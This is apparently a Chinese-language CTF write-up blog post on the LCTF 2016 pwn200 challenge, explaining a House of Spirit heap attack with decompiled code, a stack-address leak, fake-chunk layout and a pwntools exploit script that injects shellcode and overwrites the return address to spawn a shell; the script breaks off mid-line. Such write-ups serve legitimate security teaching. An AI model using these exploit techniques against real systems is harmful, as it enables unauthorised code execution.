&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608205143594.png&#34; alt=&#34;image-20230608205143594&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;LCTF-2016-pwn200&#34;&gt;&lt;a href=&#34;#LCTF-2016-pwn200&#34; class=&#34;headerlink&#34; title=&#34;LCTF 2016 pwn200&#34;&gt;&lt;/a&gt;LCTF 2016 pwn200&lt;/h2&gt;&lt;p&gt;​		看一下有rwx段,可以写shellcode,本来是想打onegadget的,不过这种打法还需要泄露libc的地址&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/heap/houseofsp&lt;span class=&#34;meta&#34;&gt;# checksec pwn200&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/heap/houseofsp/pwn200&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No &lt;span class=&#34;title function_&#34;&gt;PIE&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0x400000&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RWX:      Has RWX segments&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_&#34;&gt;sub_400A8E&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 i; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-40h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v2[&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-30h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;who are u?&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;; i &amp;lt;= &lt;span class=&#34;number&#34;&gt;47&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;v2[i], &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v2[i] == &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v2[i] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s, welcome to xdctf~\n&amp;quot;&lt;/span&gt;, v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;give me your id ~~?&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_4007DF();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; sub_400A29();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sub_4007DF&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; nptr[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt;= &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;nptr[i], &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nptr[i] == &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; )  &lt;span class=&#34;comment&#34;&gt;//换行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      nptr[i] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;  &lt;span class=&#34;comment&#34;&gt;//空字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nptr[i] &amp;gt; &lt;span class=&#34;number&#34;&gt;57&lt;/span&gt; || nptr[i] &amp;lt;= &lt;span class=&#34;number&#34;&gt;47&lt;/span&gt; ) &lt;span class=&#34;comment&#34;&gt;// 如果不是数字的话,就打印出来(只读取一个了就),如果是的话,跳过&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;0x%x &amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)nptr[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = atoi(nptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v2 &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; atoi(nptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		要先想办法泄露地址,输入回车的会被替换成0(就相当于字符串到最后了,被截断)&lt;/p&gt;
&lt;p&gt;​		把前面修改为  0x40 fastbin大小,,然后进行free, 然后malloc获取到ret地址,然后就修改ret进行getshell&lt;/p&gt;
&lt;h2 id=&#34;泄露地址&#34;&gt;&lt;a href=&#34;#泄露地址&#34; class=&#34;headerlink&#34; title=&#34;泄露地址&#34;&gt;&lt;/a&gt;泄露地址&lt;/h2&gt;&lt;p&gt;​		不要遗漏每一个函数和语句!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230607111909013.png&#34; alt=&#34;image-20230607111909013&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		输入48个A泄露rbp&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;h2 id=&#34;伪造chunk&#34;&gt;&lt;a href=&#34;#伪造chunk&#34; class=&#34;headerlink&#34; title=&#34;伪造chunk&#34;&gt;&lt;/a&gt;伪造chunk&lt;/h2&gt;&lt;p&gt;​		这里是输入money那里,可以直接覆盖到ptr指针,把ptr覆盖了,覆盖成当前rbp的地址之前的某个位置,伪造chunk,free,然后再申请拿到这一块内存控制权限,然后就可以修改ret了,但是两个问题,&lt;/p&gt;
&lt;p&gt;​		1.不知道libc的地址,知道的话,可以直接onegadget了,所以书中的解法是用了shellcode&lt;/p&gt;
&lt;p&gt;​		2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230607114236103.png&#34; alt=&#34;image-20230607114236103&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		可以看一下最终的效果图,很清晰&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608201414380.png&#34; alt=&#34;image-20230608201414380&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io = remote(&amp;#x27;0.0.0.0&amp;#x27;, 10001)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn200&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = asm(shellcraft.amd64.linux.sh(), arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;leak&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; fake_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; shellcode_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = shellcode.rjust(&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;who are u?\n&amp;quot;&lt;/span&gt;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.recvuntil(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	rbp_addr = u64(io.recvn(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	shellcode_addr = rbp_addr - &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; - &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fake_addr = rbp_addr - &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;		&lt;span class=&#34;comment&#34;&gt;# make fake.size = 0x40&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	log.info(&lt;span class=&#34;string&#34;&gt;&amp;quot;shellcode address: 0x%x&amp;quot;&lt;/span&gt; % shellcode_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	log.info(&lt;span class=&#34;string&#34;&gt;&amp;quot;fake chunk address: 0x%x&amp;quot;&lt;/span&gt; % fake_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;house_of_spirit&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;give me your id ~~?\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;65&amp;#x27;&lt;/span&gt;)	&lt;span class=&#34;comment&#34;&gt;# next.size = 0x41&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fake_chunk  = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) * &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fake_chunk += p64(&lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;)							&lt;span class=&#34;comment&#34;&gt;# fake.size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fake_chunk  = fake_chunk.ljust(&lt;span class=&#34;number&#34;&gt;0x38&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fake_chunk += p64(fake_addr)					&lt;span class=&#34;comment&#34;&gt;# overwrite pointer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;give me money~\n&amp;quot;&lt;/span&gt;, fake_chunk)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice : &amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;# free(fake_addr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice : &amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;# malloc(fake_addr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;long?&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;48&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p64(shellcode_addr) 					&lt;span class=&#34;comment&#34;&gt;# overwrite return address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = payload.ljust(&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;, &lt;span 